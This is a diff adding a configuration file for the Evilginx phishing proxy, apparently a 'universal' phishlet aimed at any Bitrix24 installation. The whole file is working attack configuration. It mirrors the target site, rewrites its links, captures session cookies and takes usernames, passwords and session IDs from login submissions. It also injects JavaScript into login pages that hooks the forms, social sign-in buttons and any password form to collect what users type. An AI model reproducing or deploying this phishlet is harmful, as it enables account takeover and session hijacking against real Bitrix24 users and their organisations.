@@ -1,0 +1,217 @@
+author: 'sweetpotatohack'
+min_ver: '3.0.0'
+
+# Universal Bitrix24 phishlet - works with any Bitrix24 installation
+# Usage: Set target domain via evilginx config
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: '{target_domain}', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: '{target_domain}', orig_sub: '', domain: '{target_domain}', search: '{target_domain}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+
+auth_tokens:
+  # Common Bitrix24 cookies
+  - domain: '.{target_domain}'
+    keys: ['BITRIX_SM_LOGIN', 'BITRIX_SM_UIDH', 'BITRIX_SM_CC', 'BITRIX_SM_SALE_UID', 'BITRIX_SM_GUEST_ID', 'BITRIX_SM_NCC']
+  - domain: '{target_domain}'  
+    keys: ['BITRIX_SM_LOGIN', 'BITRIX_SM_UIDH', 'BITRIX_SM_CC', 'BITRIX_SM_SALE_UID']
+
+auth_urls:
+  - '/index.php?login=yes'
+  - '/auth/'
+  - '/login/'
+  - '/bitrix/admin/'
+  - '/bitrix/tools/oauth/'
+
+credentials:
+  username:
+    key: 'USER_LOGIN'
+    search: '(USER_LOGIN=([^&]*)|name=["\']USER_LOGIN["\'].*?value=["\']([^"\']*)["\'])'
+    type: 'post'
+  password:
+    key: 'USER_PASSWORD' 
+    search: '(USER_PASSWORD=([^&]*)|name=["\']USER_PASSWORD["\'].*?value=["\']([^"\']*)["\'])'
+    type: 'post'
+  custom:
+    - key: 'bitrix_sessid'
+      search: '(bitrix_sessid=([^&]*)|"bitrix_sessid":\s*"([^"]*)")'
+      type: 'post'
+    - key: 'AUTH_FORM'
+      search: '(AUTH_FORM=([^&]*)|name=["\']AUTH_FORM["\'].*?value=["\']([^"\']*)["\'])'
+      type: 'post'
+    - key: 'TYPE'
+      search: '(TYPE=([^&]*)|name=["\']TYPE["\'].*?value=["\']([^"\']*)["\'])'
+      type: 'post'
+
+login:
+  domain: '{target_domain}'
+  path: '/index.php?login=yes'
+
+force_post:
+  - path_regexp: '.*/index\.php.*'
+    search: 'USER_LOGIN'
+    force: true
+  - path_regexp: '.*/auth/.*'  
+    search: 'USER_PASSWORD'
+    force: true
+  - path_regexp: '.*/login/.*'
+    search: 'USER_LOGIN'
+    force: true
+
+js_inject:
+  - trigger_domains: ["{target_domain}"]
+    trigger_paths: ["/index.php", "/auth/", "/login/", "/bitrix/admin/"]
+    trigger_params: ["login"]
+    script: |
+      var p = new Promise(function(resolve, reject) {
+        var to = setTimeout(function() {
+          reject();
+        }, 10000);
+        
+        // Multiple form selectors for different Bitrix24 layouts
+        var authSelectors = [
+          'form[name="form_auth"]',
+          'form[action*="login"]',
+          'form[action*="auth"]',
+          'form[action*="index.php"]',
+          '.bx-auth-form form',
+          '#bx_auth_form'
+        ];
+        
+        var authForm = null;
+        for (var i = 0; i < authSelectors.length; i++) {
+          authForm = document.querySelector(authSelectors[i]);
+          if (authForm) break;
+        }
+
+        if (authForm) {
+          authForm.addEventListener('submit', function(e) {
+            var loginField = authForm.querySelector('input[name="USER_LOGIN"]') ||
+                           authForm.querySelector('input[type="text"]') ||
+                           authForm.querySelector('input[placeholder*="огин"]') ||
+                           authForm.querySelector('input[placeholder*="Login"]');
+            
+            var passField = authForm.querySelector('input[name="USER_PASSWORD"]') ||
+                          authForm.querySelector('input[type="password"]') ||
+                          authForm.querySelector('input[placeholder*="ароль"]') ||
+                          authForm.querySelector('input[placeholder*="Password"]');
+            
+            var sessidField = authForm.querySelector('input[name="bitrix_sessid"]') || 
+                             document.querySelector('input[name="bitrix_sessid"]') ||
+                             document.querySelector('meta[name="bitrix-csrf-token"]');
+            
+            if (loginField && passField && loginField.value && passField.value) {
+              clearTimeout(to);
+              resolve({
+                username: loginField.value,
+                password: passField.value,
+                sessid: sessidField ? (sessidField.value || sessidField.content) : '',
+                form_type: 'standard_auth'
+              });
+            }
+          });
+        }
+
+        // Social auth handling
+        var socialBtns = document.querySelectorAll('.bx-auth-serv-icon, .social-auth-btn, [onclick*="BxShowAuthService"]');
+        socialBtns.forEach(function(btn) {
+          btn.addEventListener('click', function() {
+            var provider = 'Unknown';
+            if (btn.classList.contains('google') || btn.innerHTML.toLowerCase().includes('google')) {
+              provider = 'Google';
+            } else if (btn.classList.contains('liveid') || btn.innerHTML.toLowerCase().includes('live')) {
+              provider = 'LiveID';
+            } else if (btn.classList.contains('facebook') || btn.innerHTML.toLowerCase().includes('facebook')) {
+              provider = 'Facebook';
+            }
+            
+            clearTimeout(to);
+            resolve({
+              social_auth: true,
+              provider: provider,
+              form_type: 'social_auth'
+            });
+          });
+        });
+
+        // Check for already authenticated state
+        var indicators = [
+          'check_key=',
+          'user_id=',
+          '/(?login=)',
+          'bx-user-block',
+          '.bx-layout-inner-left'
+        ];
+        
+        var currentUrl = window.location.href;
+        var hasAuthIndicator = indicators.some(function(indicator) {
+          if (indicator.startsWith('/') && indicator.endsWith('/')) {
+            return new RegExp(indicator.slice(1, -1)).test(currentUrl);
+          }
+          return currentUrl.includes(indicator) || document.querySelector(indicator);
+        });
+
+        if (hasAuthIndicator) {
+          clearTimeout(to);
+          resolve({
+            authenticated: true,
+            form_type: 'already_auth'
+          });
+        }
+
+        // Fallback: try to detect any form submission
+        var allForms = document.querySelectorAll('form');
+        allForms.forEach(function(form) {
+          if (form.querySelector('input[type="password"]')) {
+            form.addEventListener('submit', function(e) {
+              var inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
+              var data = {};
+              inputs.forEach(function(input) {
+                if (input.value) {
+                  data[input.name || input.type] = input.value;
+                }
+              });
+              
+              if (Object.keys(data).length > 0) {
+                clearTimeout(to);
+                resolve({
+                  form_data: data,
+                  form_type: 'fallback_auth'
+                });
+              }
+            });
+          }
+        });
+      });
+      return p;
+
+landing_filters:
+  - hostname: '{target_domain}'
+    path: '/index.php'
+    mime: 'text/html'
+    regexp: '{target_domain}'
+    replace: '{hostname}'
+  - hostname: '{target_domain}'  
+    path: '/index.php'
+    mime: 'text/html'
+    regexp: 'https://{target_domain}'
+    replace: 'https://{hostname}'
+  - hostname: '{target_domain}'
+    mime: 'text/html'
+    regexp: 'action="[^"]*\/index\.php[^"]*"'
+    replace: 'action="/index.php?login=yes"'
+  - hostname: '{target_domain}'
+    mime: 'text/html'
+    regexp: '\/bitrix\/(js|css|tools)\/'
+    replace: '/bitrix/$1/'
+
+auto_filter:
+  - hostname: '{target_domain}'
+    regexp: '(https?://){target_domain}'
+    replace: '{proto}{hostname}'
+    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']
+  - hostname: '{target_domain}'
+    regexp: '{target_domain}'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']
